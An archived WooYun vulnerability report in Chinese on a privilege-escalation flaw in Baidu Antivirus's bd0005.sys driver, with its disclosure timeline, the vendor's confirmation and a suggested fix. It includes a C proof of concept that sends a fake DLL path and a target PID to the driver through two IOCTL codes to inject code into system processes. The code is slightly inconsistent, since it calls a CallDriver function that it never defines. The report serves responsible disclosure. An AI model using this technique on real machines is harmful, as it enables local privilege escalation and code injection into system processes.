{"id": 38806, "wybug_id": "wooyun-2015-0120175", "wybug_title": "百度杀毒某驱动APC注入DLL到任意进程可被提权利用", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-06-13 10:27", "wybug_open_date": "2015-09-14 16:52", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向公众公开  简要描述： 百度杀毒bd0005.sys在将某功能dll注入其他进程时，未对dll的合法性以及被注入进程是否为系统关键进程做验证，导致恶意利用可以将任意代码注入任意system权限进程，实现提权。 详细说明：  1.漏洞成因：百度杀毒bd0005.sys会将BdSbxDll.DLL这个模块通过APC注入到运行在沙箱内的进程，但在注入前未对dll的路径有效性、签名有效性，以及被注入进程进行验证。那么攻击者完全可以自己构造一个假的BdSbxDll.DLL，放在任意目录下，通过DeviceIoControl，IoControlCode=0x12364020将假BdSbxDll.DLL的路径传给bd0005.sys，再通过IoControlCode=0x1235e658将任意进程的PID传给bd0005.sys触发漏洞。从而实现任意代码运行在任意进程体内，包括explorer.exe、csrss、svchost等系统关键进程。2.百度杀毒版本：\n\n3.bd0005.sys版本：2.0.0.114.攻击效果：\n\n\n\n   漏洞证明：  \nDWORD GetPidByName(LPCTSTR pName){\tif(!pName)\t\treturn 0;\tHANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tif(INVALID_HANDLE_VALUE == hSnap)\t\treturn 0;\tDWORD dwPid = 0;\tPROCESSENTRY32 item = { 0 };\titem.dwSize = sizeof(PROCESSENTRY32);\tBOOL bNext = Process32First(hSnap, &item);\twhile (bNext)\t{\t\tif(StrStrI(item.szExeFile, pName))\t\t{\t\t\tdwPid = item.th32ProcessID;\t\t\tbreak;\t\t}\t\titem.dwSize = sizeof(PROCESSENTRY32);\t\tbNext = Process32Next(hSnap, &item);\t}\tCloseHandle(hSnap);\treturn dwPid;}void Fuzz2(HANDLE hDev){\tDWORD dwReturned = 0;\tDWORD dwPid = GetPidByName(_T(\"explorer.exe\"));//可以是csrss.exe等任意其他进程\tchar* path = \"c:\\\\fake\\\\\";\tDeviceIoControl(hDev,\t\t0x12364020,\t\t(LPVOID)path,\t\tstrlen(path),\t\tNULL,\t\t0,\t\t&dwReturned,\t\tNULL);\tDeviceIoControl(hDev,\t\t0x1235e658, \t\t(LPVOID)&dwPid,\t\t4, \t\t(LPVOID)0,\t\t0, \t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\Bd0005Ctl\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tCallDriver(hDev);\t\tCloseHandle(hDev);\t}}int _tmain(int argc, _TCHAR* argv[]){\t\tFuzz1();\t\treturn 0;}\n   修复方案：  在使用APC插入dll到Ring3之前，对dll的合法性、被插入进程进行验证，不要注入没有运行在沙箱保护内的进程。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-16 16:51 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}